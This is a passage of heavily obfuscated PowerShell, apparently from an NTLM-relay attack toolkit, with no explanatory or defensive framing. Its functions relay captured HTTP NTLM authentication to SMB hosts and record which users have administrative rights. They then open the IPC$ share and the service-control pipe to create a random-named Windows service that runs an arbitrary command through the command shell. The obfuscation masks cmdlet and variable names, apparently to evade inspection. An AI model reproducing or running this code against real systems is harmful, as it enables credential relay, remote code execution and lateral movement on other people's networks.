                    ${In`VE`IG`h_ENu`mERATe}."cOu`NT" = ${IN`VeiGH}."ENUMER`A`Te"."cO`Unt"

                    for(${I}=0; ${i} -lt ${Hos`TNAmE`_En`coDed}."c`Ount"; ${I}++)
                    {

                        if(${Inve`igh_`eNu`m`eRAtE}[${I}]."h`OST`NAmE")
                        {
                            ${tar`G`eTS} += ${I`NVEiGh_eNum`Er`ATE}[${I}]."HOSTna`ME"
                        }
                        elseif(${iNV`e`i`G`H_ENuMerATE}[${I}]."Ip")
                        {
                            ${TA`R`GEts} += ${inVEI`gh_En`UMer`A`Te}[${i}]."i`p"
                        }

                    }

                    ${S`MB_t`A`RGEt_Re`SUl`Ts} = &("{1}{3}{2}{4}{0}"-f 'et','Test','MB','-S','Targ') ${t`ARg`etS} ${SEsSIoNL`I`m`It`Un`pRIv}
                }

                ${Cli`E`Nt} = ${SmB_t`A`RGeT_R`ESUlts}[0]
                ${taR`G`et} = ${smB`_tAr`G`E`T_REsUl`TS}[1]
            }

            if(${t`ARGET} -and !${i`Nve`Igh}."RE`L`Ay_H`IStoRY_T`AB`lE".${s`ourc`Eip})
            {
                ${I`N`VeIGh}."relaY_his`T`ory_t`A`Ble"."a`dd"(${SoUR`CeIP},[Array]${T`A`RGEt})
            }
            elseif(${t`AR`geT} -and ${iN`V`eigH}."RE`L`Ay_`h`IsTo`RY_Ta`BlE".${s`oUR`ceiP} -notcontains ${t`ArgeT})
            {
                ${I`NvE`iGH}."rE`Lay`_HISTORY`_ta`BlE".${sOu`R`cEIp} += ${T`ARG`et}
            }

        }
        catch
        {
            ${eRROr_`me`S`S`AgE} = ${_}."eX`CE`pti`On"."m`Es`SAGe"
            ${E`R`RoR_`MESsage} = ${ERror_ME`sS`A`ge} -replace "`n",""
            ${InV`Ei`gH}."OUtpU`T_`qUeuE"."A`DD"(("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim()) ")) > ${Nu`Ll}
        }

        return ${cL`i`EnT},${t`Arg`ET}
    }

    function InvokE-SMBRe`LaY`ChAL`lEN`ge
    {
        param (${cl`IEnt},${Ht`TP_r`e`qUESt_BYT`eS},${SMB`_VErS`IOn},${SMb`_PrOC`ES`s`_ID})

        try
        {
            ${CLIeNt_`ST`Re`AM} = ${C`LIEnt}.("{1}{0}" -f'tStream','Ge').Invoke()
            ${C`l`I`eNT_rEcEI`Ve} = &("{2}{3}{0}{1}" -f'je','ct','Ne','w-Ob') ("{4}{3}{2}{0}{1}"-f'.By','te[]','em','t','Sys') 1024
            ${m`ESs`A`Ge_ID} = 2
            ${tree`_Id} = 0x00,0x00,0x00,0x00
            ${se`ss`i`oN_ID} = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
            ${P`ACkET`_sMB`2_hea`D`eR} = &("{1}{3}{0}{2}{4}{5}" -f 'B2H','Ne','e','w-PacketSM','ad','er') 0x01,0x00 0x1f,0x00 ${Fa`lsE} ${mess`A`ge`_ID} ${sMB_`prO`ceSS`_`ID} ${Tr`ee_`iD} ${s`eSSIo`N_`ID}
            ${PaC`k`et_nTlmS`Sp_Ne`GOT`IAtE} = &("{3}{1}{4}{0}{2}"-f 'MSS','PacketN','PNegotiate','New-','TL') 0x07,0x82,0x08,0xa2 ${Http`_REqueST`_by`TEs}[(${HT`TP_`Re`Q`U`est_ByteS}."lEN`G`TH"-8)..(${Ht`Tp_REQuE`s`T`_BY`TEs}."Len`gTh")]
            ${Smb`2_H`eadEr} = &("{4}{5}{0}{3}{8}{6}{7}{1}{2}{9}"-f '-','io','na','Pa','ConvertFro','m','ic','t','cketOrderedD','ry') ${P`ACKEt_SmB`2_He`ADeR}
            ${ntl`MsSP`_nEgOT`iate} = &("{6}{0}{3}{5}{2}{1}{4}" -f'v','ctio','Di','ertF','nary','rom-PacketOrdered','Con') ${PA`ckEt_nTl`ms`SP`_`NE`goTiATE}       
            ${PAc`kET_`Sm`B2_D`AtA} = &("{4}{2}{7}{1}{3}{8}{0}{5}{6}{9}" -f 'i','M','w-Packet','B','Ne','o','nSetup','S','2Sess','Request') ${NtLMsSp_N`eg`OT`IATE}
            ${smB2`_D`ATa} = &("{6}{8}{2}{1}{0}{5}{4}{7}{3}"-f 'm-Pa','Fro','t','onary','edD','cketOrder','Con','icti','ver') ${P`AckeT`_SMB2_`dATa}
            ${pAcke`T`_nET`BiO`s_S`ES`Sion_se`RvIce} = &("{1}{0}{3}{5}{4}{2}" -f'cketN','New-Pa','e','etB','SSessionServic','IO') ${S`mb2_h`eADER}."lENG`TH" ${smb`2_`daTa}."le`N`gth"
            ${NEtbiO`s_`SESs`ioN_se`R`ViCE} = &("{7}{5}{1}{2}{6}{8}{0}{4}{9}{3}{10}"-f'rdered','v','ertFrom-Pac','ona','Di','on','k','C','etO','cti','ry') ${pAc`ket`_Ne`Tbi`os_sessIOn_`SE`RvICE}
            ${c`li`eNT_SenD} = ${NEtBiOS`_sessio`N_`Serv`ICE} + ${sMB`2_HEA`d`ER} + ${s`mb2_D`A`Ta}
            ${ClI`En`T`_STrE`Am}.("{0}{1}"-f 'Writ','e').Invoke(${ClIE`NT`_S`EnD},0,${cl`i`E`Nt_SEND}."L`ENGth") > ${N`Ull}
            ${Cl`IenT`_`S`Tream}.("{1}{0}" -f 'h','Flus').Invoke()    
            ${C`L`IENt_StRE`AM}.("{0}{1}" -f'Re','ad').Invoke(${CliEN`T`_`Re`CeiVe},0,${cLi`ENt_rEce`I`VE}."Leng`Th") > ${Nu`ll}
        }
        catch
        {
            ${E`Rror_M`E`s`SAGE} = ${_}."e`x`CEpTi`oN"."M`eS`sagE"
            ${E`RrO`R_m`ESsAGe} = ${ER`ROR_`MeS`SagE} -replace "`n",""
            ${i`NVEI`gH}."O`UT`PUt_qU`eUE"."a`dd"(("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim()) ")) > ${nU`ll}
        }

        return ${cLiEn`T_r`e`ceI`VE}
    }

    function i`NVoke-sMBRelA`Yr`esponSE
    {
        param (${cL`Ient},${ht`Tp_`R`equEst_byTEs},${s`m`B_ve`RSioN},${SM`B_USer`_`ID},${S`E`sSioN`_ID},${SMb_p`RoC`ESS`_id})
    
        try
        {
            ${clI`enT_`Re`CEIvE} = &("{2}{0}{1}"-f '-Ob','ject','New') ("{3}{2}{0}{1}" -f'[',']','m.Byte','Syste') 1024

            if(${Cl`ieNT})
            {
                ${S`MB`_rE`La`Y_r`eSPOnS`E_streaM} = ${ClI`ENT}.("{1}{0}{2}"-f 'e','GetStr','am').Invoke()
            }

            ${me`SsA`gE_id} = 3
            ${t`ReE`_Id} = 0x00,0x00,0x00,0x00
            ${p`ACKEt_smb`2`_hEader} = &("{3}{5}{0}{2}{4}{1}" -f'ack','eader','et','Ne','SMB2H','w-P') 0x01,0x00 0x1f,0x00 ${Fa`L`sE} ${Mes`s`AgE`_Id} ${SmB_pr`Oce`Ss`_`Id} ${TRe`E`_ID} ${sESSIO`N_`iD}
            ${p`AcKET_`N`Tlm`sSP_`AUth} = &("{3}{2}{0}{4}{1}"-f 'TLMSS','h','ew-PacketN','N','PAut') ${Ht`TP_`Re`QuEsT_BYtES}
            ${S`Mb`2_HeA`dEr} = &("{5}{6}{2}{1}{9}{8}{4}{0}{3}{7}"-f'tiona','Pa','-','r','eredDic','Conv','ertFrom','y','rd','cketO') ${PackeT_s`MB2`_`hEAd`ER}
            ${n`TlMs`Sp`_Auth} = &("{6}{5}{1}{3}{0}{2}{4}"-f 'redDict','tO','iona','rde','ry','rom-Packe','ConvertF') ${Pac`keT_nTl`mS`sP_`AUtH}        
            ${pA`cKeT_smb2_d`A`Ta} = &("{4}{0}{5}{2}{8}{3}{6}{7}{9}{1}"-f'ew-','quest','tSMB2','S','N','Packe','e','tup','Session','Re') ${n`TlmS`sp`_aUTH}
            ${smB2`_D`A`TA} = &("{5}{9}{1}{0}{6}{8}{3}{2}{4}{7}"-f 'ck','Pa','dD','e','i','Conv','etOrd','ctionary','er','ertFrom-') ${pAC`k`Et_Smb`2_`d`ATA}
            ${p`ACket_`Ne`Tbi`OS_sEsSiO`N_Ser`VICE} = &("{3}{0}{4}{2}{1}{5}" -f 'ck','OSSessionSer','I','New-Pa','etNetB','vice') ${SmB2`_H`EADEr}."l`en`gtH" ${Smb`2_`datA}."L`en`gTh"
            ${Ne`TBioS_`SesSIo`N_Ser`VICE} = &("{1}{4}{8}{6}{0}{3}{5}{7}{2}" -f'Pa','Co','y','cketOrde','nv','red','tFrom-','Dictionar','er') ${packEt_nEtB`iO`S_s`Essi`oN_`s`Er`ViCe}
                ${CLIent`_s`END} = ${nE`T`B`ios_SE`SSion`_SE`Rvice} + ${smB`2`_`HEaDer} + ${s`m`B2_D`Ata}
            ${smB`_rELAY`_`Re`SPo`NSe_StrEAm}.("{1}{0}" -f 'ite','Wr').Invoke(${cli`ent_S`END},0,${c`LIEnt`_`sEnd}."L`eN`Gth") > ${N`UlL}
            ${S`M`B_rE`lA`y`_rEspoN`sE_StrE`AM}.("{1}{0}"-f 'lush','F').Invoke()
            ${s`M`B_R`ELAy`_`RESpON`SE`_sTREAm}.("{1}{0}" -f 'ad','Re').Invoke(${c`lIEN`T`_`RecEIVE},0,${CLIENT_R`E`c`EivE}."LeNG`Th") > ${n`UlL}
            
            if((${sM`B`_VeRSIon} -eq ("{0}{1}" -f 'S','MB1') -and  ( &("{2}{1}{0}" -f 'Le','aRiaB','Get-v') xV8qnb  -VaLu)::"Tostr`I`Ng"(${C`LiE`NT_R`eceive}[9..12]) -eq ("{1}{0}{2}"-f '0-00-','00-0','00')) -or (${s`Mb_VErSi`oN} -ne ("{1}{0}"-f 'MB1','S') -and  ( &("{0}{1}"-f 'It','em')  ('v'+'ARIaB'+'LE:'+'xV8qnB') ).Value::"T`OsTR`iNG"(${Cl`IeNT_re`ceIVE}[12..15]) -eq ("{3}{1}{2}{0}" -f '0','-0','0-00-0','00')))
            {
                ${smb_r`E`La`Y_FAi`lEd} = ${Fa`lsE}
                ${inve`IgH}."o`U`TPUt_que`Ue"."a`dD"(("[!] [$(Get-Date -format s)] $HTTP_type to SMB relay authentication successful for $HTTP_username_full on $Target ")) > ${nU`lL}              
            }
            else
            {

                for(${i} = 0;${i} -lt ${I`Nv`EiGH}."en`UmeRa`Te"."cou`NT";${i}++)
                {

                    if(${INvE`igh}."ENU`M`eRaTe"[${I}]."I`p" -eq ${tARg`Et})
                    {
                        ${Ta`RgET_`ind`ex} = ${i}
                        break
                    }

                }

                ${Tar`GET_HO`Stna`Me} = ${InV`Ei`gH}."E`NumE`RaTE"[${T`A`RG`ET_iNDEx}]."HosTn`A`ME"
                ${tar`gET_D`NS_DO`M`AIn} = ${Inv`E`iGH}."eNU`m`E`RAte"[${t`A`Rg`et_`INdeX}]."DNS Domain"

                if(${Fai`L`eDLo`GINs`TRIct} -eq 'Y' -or (${hTT`p_`NTlM_d`OmA`IN`_StRINg} -and ((!${tARgET`_h`Os`T`NaME} -or !${TA`R`GEt_Dn`S_doM`AiN}) -or (${tAR`geT_`HO`st`NAmE} -and ${T`Ar`GET_DnS_`D`OMAIn} -and ${TaRge`T`_HOst`NA`ME} -ne ${TA`RgEt_`dN`S`_DOMaIn}))))
                {

                    if(!${I`NV`EiGh}."rE`LAy`_fA`iLED`_l`ogIn`_tAbLe".("{3}{2}{0}{1}" -f's','Key','ontain','C').Invoke(${htT`P_`UseRNAme_`FUlL}))
                    {
                        ${inVEi`gh}."reL`AY_F`AIl`e`D_lOgIn_tABLe"."a`dD"(${Ht`Tp_`Us`E`RnA`mE_f`ULL},[Array]${taRg`ET})
                    }
                    else
                    {
                        ${inVe`IgH}."r`ElA`Y`_fa`iLED_`LOgin`_Ta`BLe".${HTt`p_UsE`R`N`AMe_full} += ${Ta`RG`eT}
                    }

                }

                ${S`mB_`ReLAY`_fAiLeD} = ${T`RuE}
                ${c`LIEnt}.("{0}{1}" -f 'Clos','e').Invoke()
                ${INv`eI`gh}."Outp`UT_`QUEUE"."a`DD"(("[!] [$(Get-Date -format s)] $HTTP_type to SMB relay authentication failed for $HTTP_username_full on $Target ")) > ${N`Ull}
            }

        }
        catch
        {
            ${Er`Ror_MESSA`GE} = ${_}."exCEPT`I`ON"."MEs`SaGe"
            ${eR`Ro`R_mE`Ss`AgE} = ${e`RrO`R_m`E`SSAGe} -replace "`n",""
            ${I`Nv`EiGH}."o`Ut`PUt_q`UEUE"."A`DD"(("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim()) ")) > ${Nu`ll}
            ${smB_`RE`lAy_Fa`ILed} = ${tR`UE}
        }

        return ${sMb_RE`la`Y_FA`ileD}
    }

    function G`E`T-sTAtuSpE`Nd`i`Ng
    {
        param ([Byte[]]${sT`ATus})

        if(  (  &("{2}{1}{0}{3}" -f 'V','t-','Ge','AriAbLe') ('x'+'v8QNB')  -VAlUeOn  )::("{1}{0}{2}"-f 'i','ToStr','ng').Invoke(${s`T`Atus}) -eq ("{0}{1}{2}"-f'0','3-01-00','-00'))
        {
            ${StATus_`peND`inG} = ${T`Rue}
        }

        return ${STaT`US`_pendi`NG}
    }
    
    function iN`VOKe-`SmBRe`lAy`e`xeCuTe
    {
        param (${C`LI`ENT},${sMB`_`VERS`IoN},${SmB_U`s`ER_ID},${sES`sI`ON_id},${s`mB_PROceS`s`_iD},${a`cCes`sChE`CK})

        ${ClIENt_REC`eI`VE} = &("{0}{1}{2}" -f'New-Ob','j','ect') ("{0}{1}{3}{2}" -f 'System.B','yte',']','[') 1024

        if(!${se`RvIce})
        {
            ${sMB_SeRV`I`CE_`R`AnDoM} =  (  &("{0}{2}{1}" -f 'V','IaBLE','aR')  ("2"+"sdc9m") -VA  )::("{1}{0}"-f 'in','Jo').Invoke("00-",(1..20 | &("{0}{4}{1}{2}{3}" -f'For','h-Obj','e','ct','Eac'){"{0:X2}-" -f (&("{1}{0}{2}" -f'n','Get-Ra','dom') -Minimum 65 -Maximum 90)}))
            ${sm`B_sERv`ICE} = ${sMb`_S`e`RV`ic`e_RANd`Om} -replace "-00",""
            ${Smb_SE`RV`i`cE} = ${Smb`_ser`V`Ice}.("{2}{1}{0}"-f 'ng','stri','Sub').Invoke(0,${Sm`B_se`RVicE}."leNG`Th" - 1)
            ${sm`B`_Se`RvIcE} = ${sMb_SER`V`I`Ce}.("{1}{0}" -f 't','Spli').Invoke("-") | &("{1}{0}{2}" -f'or','F','Each-Object'){[Char]  $4vXn::("{1}{0}"-f'nt16','ToI').Invoke(${_},16)}
            ${S`MB_SE`RV`iCE} = &("{0}{1}{2}"-f'New-Ob','j','ect') ("{1}{0}{3}{4}{2}" -f 'stem.S','Sy','ing','t','r') (${smb_S`e`RvIce},0,${SM`B_SER`VICE}."Leng`TH")
            ${S`mb_ServIce_ra`N`dOM} += ("{2}{1}{0}{3}"-f'-00-00-0','00','00-','0')
            ${SmB_se`RV`i`CE_`BY`Tes} = ${Sm`B_seRVI`C`E_`R`AnD`oM}.("{1}{0}" -f 'it','Spl').Invoke("-") | &("{0}{3}{4}{2}{1}" -f 'F','ect','-Obj','orEa','ch'){[Char]  $4VXn::("{2}{1}{0}" -f'6','1','ToInt').Invoke(${_},16)}   
        }
        else
        {
            ${S`mB_seRV`I`ce} = ${sErv`ICe}
            ${smb_SE`RVI`C`e`_bytes} =   ( &("{3}{0}{2}{1}" -f'T-','AriaBle','v','ge') ixgD  ).VAlue::"uNIC`odE".("{0}{1}" -f'G','etBytes').Invoke(${ser`V`iCE})

            if([Bool](${S`m`B_serV`ICe}."lEN`gtH" % 2))
            {
                ${Smb_sER`ViCE`_`ByTes} += 0x00,0x00
            }
            else
            {
                ${smb`_s`ErV`ic`E_ByteS} += 0x00,0x00,0x00,0x00
            
            }

        }

        ${S`mb_Ser`VI`ce_leNg`Th} =   $XV8QNb::("{2}{1}{0}"-f'tBytes','e','G').Invoke(${Sm`B`_sERvI`cE}."lEN`G`Th" + 1)
        ${C`oM`maNd} = ('%'+'C'+'OMSP'+'EC% '+'/C'+' '+"`"") + ${COm`mANd} + "`""
          $IXGd::"U`Tf8".("{1}{0}{2}"-f 'y','GetB','tes').Invoke(${co`mmaNd}) | &("{3}{1}{2}{4}{0}" -f'bject','r','Eac','Fo','h-O'){${S`mBExeC`_cOm`MA`Nd} += "{0:X2}-00-" -f ${_}}

        if([Bool](${CoM`mA`ND}."l`ENg`Th" % 2))
        {
            ${SmB`EX`E`c_cOMMAnd} += ("{0}{1}"-f '00-0','0')
        }
        else
        {
            ${sM`B`Ex`Ec_`cOMmaND} += ("{3}{1}{0}{2}" -f '-00-00-0','0','0','0')
        }    
    
        ${SMBex`eC`_ComMAn`D`_b`YT`es} = ${S`m`BExec`_CommaNd}.("{0}{1}"-f 'Spli','t').Invoke("-") | &("{0}{1}{3}{4}{2}"-f 'F','or','ect','Ea','ch-Obj'){[Char] ( &("{1}{2}{0}" -f 'ablE','vaR','i') ('4'+'VXn') -vAl  )::("{1}{0}"-f 'oInt16','T').Invoke(${_},16)}  
        ${SMbE`x`e`C_C`O`mmA`Nd`_LEngTh_`BYTEs} =   ( &("{1}{2}{0}" -f 'RIAbLe','geT-','vA') XV8QnB ).valUe::("{0}{1}" -f 'GetByt','es').Invoke(${Sm`Bexec_C`omManD`_bY`TES}."Le`NGtH" / 2)
        ${smB_`P`A`Th} = "\\" + ${TARg`et} + "\IPC$"
        ${s`mB_PaTH`_`By`TES} =   (  &('lS') ("v"+"A"+"RiaBlE"+":ixGd")).VAlue::"UNiCO`DE".("{0}{1}{2}"-f 'Get','By','tes').Invoke(${SM`B`_PaTH})
        ${naMeD_P`I`pe_u`Uid} = 0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,0x00,0x10,0x03
        ${C`Li`eN`T_StrEaM} = ${cl`ient}.("{0}{1}"-f'GetStrea','m').Invoke()
        ${S`m`B`_s`pli`T_INdEX} = 4256
        ${St`AGe} = ("{0}{1}{2}" -f 'TreeCon','n','ect')
        ${mE`sSa`gE_id} =  ${InvE`iGH}."S`eSsIOn_m`ESS`AgE_iD_tA`BlE"[${In`VEigh}."Se`sS`I`On_cOu`Nt"]

        while (${STA`ge} -ne ("{0}{1}"-f 'E','xit'))
        {

            try
            {
                
                switch (${ST`AGE})
                {
        
                    ("{0}{2}{1}"-f'Check','ss','Acce')
                    {
                        
                        if(  ( &("{0}{1}{2}" -f 'GeT-','itE','M') ("VArIAbl"+"e:x"+"v8"+"Qn"+"b") ).vALue::"T`OStRI`NG"(${C`lIENt_`Re`CEIVe}[128..131]) -eq ("{1}{3}{2}{0}"-f'-00','0','-00','0-00') -and  $XV8qnB::"tOsTrI`Ng"(${CL`Ien`T`_REce`Ive}[108..127]) -ne ("{10}{16}{3}{7}{6}{2}{14}{8}{11}{1}{0}{15}{5}{4}{17}{13}{12}{9}" -f'0-00','0','-00-0','00','0','00-','00','-00-','0-0','0','0','0-','-00-00-0','-00','0-00-00-00-0','-','0-00-','0'))
                        {
                            ${s`Mb_serviC`e_m`A`N`AGE`R_C`oNT`ExT`_HANDLE} = ${ClI`e`NT_`RECeI`Ve}[108..127]
                            ${paC`KE`T_scM_daTa} = &("{0}{3}{5}{6}{4}{2}{1}{7}"-f'Ne','a','e','w-P','SCMCr','a','cket','teServiceW') ${SmB`_se`RVICe`_MaN`AG`er_CO`NT`E`xt_h`Andle} ${smb_SEr`V`Ic`e_BY`TEs} ${smb_sERvIce`_`LEN`gTH} ${s`M`Be`xe`C_comM`AnD_byt`ES} ${S`mBe`X`eC_CO`mMAnD_LEN`G`Th_bYtEs}
                            ${SC`m`_D`ATA} = &("{5}{2}{10}{1}{9}{4}{0}{8}{6}{7}{3}" -f'dere','Fr','onver','ry','PacketOr','C','ct','iona','dDi','om-','t') ${PaC`ke`T_s`cM_dATA}
                            ${InvEI`gH}."ou`T`put_Q`UeuE"."a`dd"(("[!] [$(Get-Date -format s)] $HTTP_username_full has command execution privilege on $target ")) > ${n`ULl}

                            if(${inV`eIGH}."domAI`N_`Map`p`Ing_TABLE".("{1}{0}{2}" -f'ntainsKe','Co','y').Invoke(${HT`Tp`_`NtL`m_dom`AiN_`sTRI`Ng}))
                            {
                                ${p`R`ivI`LEGE`D_USeR} = (${hT`Tp_n`Tlm_`USeR_s`TRING} + "@" + ${iNVEi`gH}."D`OmA`i`N`_MA`pPiNg`_tabLe".${h`T`TP_N`TlM_DomaIN_stRI`Ng}).("{0}{2}{1}" -f 'T','er','oUpp').Invoke()
                            }
                            else
                            {
                                ${p`RiVI`lEge`d_US`ER} = ${http_US`erNAmE_F`U`lL}
                            }

                            for(${i} = 0;${i} -lt ${IN`V`eigh}."ENu`MERA`TE"."COu`NT";${i}++)
                            {

                                if(${In`V`eIgH}."ENumEr`A`Te"[${I}]."I`p" -eq ${t`ARGEt})
                                {
                                    ${Targ`Et`_`inDex} = ${I}
                                    break
                                }

                            }

                            [Array]${PRIvI`lEgED_U`s`eR_lI`sT} = ${I`NVEIgH}."e`NUmeRaTe"[${Ta`RG`eT_iNDex}]."pR`iviL`eged"
                            
                            if(${pr`i`VIle`GEd_UsEr_`L`I`sT} -notcontains ${P`RIV`ilEGeD`_`UsER})
                            {
                                ${PrivIlE`g`e`D_`USE`R_liST} += ${P`RiviLE`ge`D_u`sER}
                                ${i`NveI`GH}."ENUme`RatE"[${TAr`GET`_In`D`eX}]."Pr`ivi`LEGEd" = ${priVIlEg`Ed_u`SE`R_L`IST}
                            }

                            if(${ac`cEss`cHeck})
                            {
                                ${sM`B_ADmin`iSTr`Ator} = ${TR`Ue}
                                ${S`M`B_C`LoS`e_SER`VICE_HA`NDL`E_sTage} = 2
                                ${st`A`GE} = ("{1}{4}{2}{0}{3}{5}"-f 'a','Close','H','n','Service','dle')
                            }
                            elseif(${SCm_D`ATa}."leNg`Th" -lt ${SMB_`Sp`LIT_I`NdeX})
                            {
                                ${St`AgE} = ("{1}{0}{3}{2}" -f'eS','Creat','iceW','erv')
                            }
                            else
                            {
                                ${s`TA`GE} = ("{3}{4}{0}{1}{2}"-f'erviceW_','Fir','st','Cr','eateS')
                            }

                        }
                        elseif( (  &("{0}{1}{2}" -f'G','ET-I','tem')  VARiablE:Xv8qnb ).vAlUE::"t`O`StriNG"(${cLi`E`Nt_`ReC`EIVe}[128..131]) -eq ("{0}{2}{3}{1}" -f '05-00-0','00','0','-'))
                        {
                            
                            if(${atTA`ck} -notcontains ("{2}{0}{1}"-f 's','ion','Ses'))
                            {
                                ${s`Mb_RE`LaY_FaiL`ed} = ${tR`Ue}
                            }

                            ${inV`eiGH}."Ou`TP`Ut_QuEuE"."a`Dd"(("[!] [$(Get-Date -format s)] $HTTP_username_full does not have command execution privilege on $Target ")) > ${Nu`ll}
                            ${S`mB`_`Se`Rvi`Ce`_maNAGEr_`CO`N`TexT_H`ANdLE} = ${Cl`I`e`Nt_RECeI`VE}[108..127]
                            ${S`m`B`_`c`L`osE_`SErViCe_`handlE_STAgE} = 2
                            ${MEssa`GE`_iD}++
                            ${sT`AGE} = ("{2}{1}{3}{0}"-f 'Handle','er','CloseS','vice')
                        }
                        else
                        {
                            ${sMb_R`E`LAY_f`AiLEd} = ${Tr`UE}
                        }

                    }

                    ("{0}{1}{2}{3}"-f'Clo','seR','eq','uest')
                    {
                        ${M`EssaG`E_iD}++
                        ${stA`ge_`CU`RRenT} = ${STA`GE}
                        ${PAck`Et_`S`m`B2_HeaD`er} = &("{4}{1}{0}{3}{2}"-f'et','Pack','der','SMB2Hea','New-') 0x06,0x00 0x01,0x00 ${FAL`SE} ${MEss`A`gE_Id} ${smB_p`Ro`cEss_`ID} ${Tree`_id} ${se`SsiON_`ID}
                        ${pac`ke`T_`sM`B2_da`Ta} = &("{3}{1}{5}{2}{0}{4}" -f'qu','ew-PacketSMB2C','seRe','N','est','lo') ${SMB`_f`I`LE_Id}
                        ${sMB`2_hEa`d`Er} = &("{2}{7}{1}{0}{4}{5}{3}{6}" -f 'rdered','rom-PacketO','Conve','n','Di','ctio','ary','rtF') ${pack`Et_s`Mb`2_HE`A`Der}
                        ${SmB`2_da`TA} = &("{3}{0}{2}{1}{6}{7}{8}{5}{9}{4}"-f'vertF','m-','ro','Con','dDictionary','d','Packet','O','r','ere') ${PA`c`KeT_S`mB2_DA`Ta}
                        ${PA`ckeT`_n`E`TbIOs_sESs`ioN_SerVICe} = &("{1}{7}{9}{5}{2}{0}{6}{3}{4}{8}"-f 'et','Ne','k','tBIOSSession','Servic','c','Ne','w-P','e','a') ${sM`B`2_H`EADeR}."lE`NGTH" ${smB2_`da`Ta}."L`e`NgtH"
                        ${n`ETBI`oS_Se`SS`io`N`_sERv`icE} = &("{2}{6}{7}{1}{4}{3}{0}{5}" -f 'na','-PacketOrd','Co','tio','eredDic','ry','nvertF','rom') ${P`ACKeT_`N`EtbiO`S_SEssIo`N_SeR`Vi`Ce}
                        ${CLI`Ent`_`send} = ${NE`T`B`IOs_sEssI`oN_S`ervicE} + ${smB2`_Head`ER} + ${S`mb2`_`Data}
                        ${sT`A`GE} = ("{0}{2}{1}"-f 'Se','Receive','nd')
                    }

                    ("{3}{1}{0}{2}" -f 'ceHan','ervi','dle','CloseS')
                    {

                        if(${sM`B`_`CLosE_sERVICE_HaNdLe`_`S`TAgE} -eq 1)
                        {
                            ${i`Nve`IGh}."O`UT`Put_queue"."A`DD"(("[!] [$(Get-Date -format s)] Service $SMB_service deleted on $Target ")) > ${nu`Ll}
                            ${S`mB`_CLOS`E`_SerVIcE`_hAN`DLE`_s`TA`ge}++
                            ${P`AC`K`et_Scm`_DaTA} = &("{4}{2}{5}{6}{1}{0}{3}" -f 'nd','ceHa','ew','le','N','-PacketSCMCloseSe','rvi') ${smb`_SERVIce_c`oNtEXT`_Ha`N`dle}
                        }
                        else
                        {
                            ${sT`A`ge} = ("{3}{0}{1}{2}" -f'q','ues','t','CloseRe')
                            ${p`Ac`KEt`_sC`m_d`ATA} = &("{0}{5}{2}{9}{7}{6}{8}{1}{3}{4}" -f 'New-Packet','vice','MClo','H','andle','SC','S','e','er','s') ${SmB_SE`RviCE_MA`Nage`R_CON`Te`xt_h`ANDLE}
                        }

                        ${mEs`sa`Ge_id}++
                        ${sTaG`e`_cUrRE`Nt} = ${s`TaGe}
                        ${PA`c`keT_S`mB2_`HeADEr} = &("{1}{5}{4}{2}{0}{3}" -f 'tS','New','ke','MB2Header','c','-Pa') 0x09,0x00 0x01,0x00 ${F`AlsE} ${mE`SSaG`e_iD} ${S`MB_`PROCe`ss`_iD} ${tre`E`_iD} ${s`E`SSIon_ID}
                        ${scm_`da`TA} = &("{4}{3}{5}{6}{7}{1}{0}{2}"-f'r','tiona','y','e','Conv','rtFr','om','-PacketOrderedDic') ${paCkeT`_s`CM_`dATA}
                        ${pAC`k`ET_RpC`_data} = &("{3}{0}{5}{2}{4}{1}"-f'P','PCRequest','t','New-','R','acke') 0x03 ${SCm_`D`ATa}."Len`GTH" 0 0 0x05,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                        ${r`p`c_dATa} = &("{3}{7}{1}{6}{2}{5}{0}{4}"-f 'ketOrderedDictio','rt','rom-Pa','Con','nary','c','F','ve') ${p`AcKEt`_rP`c_d`ATA} 
                        ${PAc`k`ET_smb`2_d`Ata} = &("{4}{2}{7}{0}{5}{6}{3}{1}" -f'cke','uest','-P','q','New','tSMB2Writ','eRe','a') ${Sm`B_FIL`E`_Id} (${r`pc_Da`Ta}."L`EnG`Th" + ${s`cm_`DaTa}."L`Eng`Th")
                        ${sMb`2_hea`dEr} = &("{0}{1}{6}{3}{8}{7}{4}{9}{2}{5}{10}"-f 'C','on','c','e','acketOrd','tion','v','om-P','rtFr','eredDi','ary') ${P`ACKET_s`MB2_he`AD`er}
                        ${s`MB2`_dAtA} = &("{3}{1}{2}{5}{0}{4}{6}"-f 'Dic','ertFro','m-PacketO','Conv','tiona','rdered','ry') ${Pac`kE`T`_Smb2_DatA} 
                        ${RPc`_`DATa_l`ENGtH} = ${S`mb2_d`ATA}."LE`NGTH" + ${sc`m_d`A`TA}."Le`N`Gth" + ${Rp`c_d`ATa}."L`eNgTH"
                        ${P`AC`k`et_NE`TbiOs`_`sEsSIOn_Se`RV`IcE} = &("{4}{2}{5}{3}{1}{0}{6}" -f 'n','o','ew-PacketNet','i','N','BIOSSess','Service') ${SMB`2`_HeaDer}."lEn`Gth" ${RP`c`_DAt`A_`Len`GTH}
                        ${NeT`BioS_SeSSIo`N_`SE`R`VIcE} = &("{6}{2}{3}{4}{0}{1}{5}"-f're','dDiction','ertFrom-Packe','tOrd','e','ary','Conv') ${pACK`eT_N`e`TBIoS_sessiON_`s`eRV`ICe}
                        ${cl`IenT`_sE`Nd} = ${n`ET`B`ios_se`sSioN`_SErvI`CE} + ${SmB`2`_`HEaDER} + ${smb2_d`A`TA} + ${Rpc_`DA`Ta} + ${Sc`M_`DAtA}
                        ${S`T`AgE} = ("{0}{1}{2}"-f 'S','endR','eceive')
                    }

                    ("{0}{2}{1}{3}"-f'CreateRe','ue','q','st')
                    {
                        ${T`RE`E_id} = ${CLI`e`N`T_ReCEiVe}[40..43]
                        ${sMB_n`AME`d`_pipE_b`Y`TEs} = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 
                        ${MeSsA`G`e_`Id}++
                        ${stA`GE_Cu`RrEnt} = ${S`TA`ge}
